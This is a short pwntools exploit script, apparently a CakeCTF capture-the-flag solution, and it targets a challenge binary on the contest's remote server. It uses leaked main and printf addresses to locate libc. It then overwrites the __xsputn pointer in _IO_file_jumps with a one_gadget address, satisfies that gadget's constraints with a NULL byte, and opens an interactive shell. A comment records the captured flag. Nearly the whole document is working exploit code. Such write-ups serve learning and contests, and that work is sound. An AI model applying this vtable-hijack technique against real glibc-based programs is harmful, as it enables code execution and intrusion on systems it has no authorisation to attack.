from pwn import *


def main():
    # context.terminal = ['tmux', 'split-w', '-h']
    binpath = './chall'
    gdbscript = '''
    gef
    b main
    b *0x55555555526d 
    c
    '''
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    # io = process(binpath)
    io = remote('pwn.cakectf.com', 9003)

    elf = ELF(binpath)
    libc = ELF('./libc-2.31.so')

    data = io.recvline()
    addr_main = int(data.split()[2], 16)
    elf.address = addr_main - elf.symbols['main']

    data = io.recvline()
    addr_printf = int(data.split()[2], 16)
    libc.address = addr_printf - libc.symbols['printf']

    print('addr_main = 0x{:x}'.format(addr_main))
    print('addr_printf = 0x{:x}'.format(addr_printf))
    print('elf.address = 0x{:x}'.format(elf.address))
    print('libc.address = 0x{:x}'.format(libc.address))

    address = libc.symbols['_IO_file_jumps'] + 0x38  # __xsputn
    io.sendlineafter(b'address: ', b'0x%x' % address)

    value = libc.address + 0xe6c81  # one_gadget
    io.sendlineafter(b'value: ', b'0x%x' % value)

    data = b'\x00'  # must be NULL to satisfy one_gadget constraints
    io.sendlineafter(b'data: ', data)

    io.interactive()


if __name__ == '__main__':
    main()
    # CakeCTF{*ABS*+0x190717@IGOTIT}
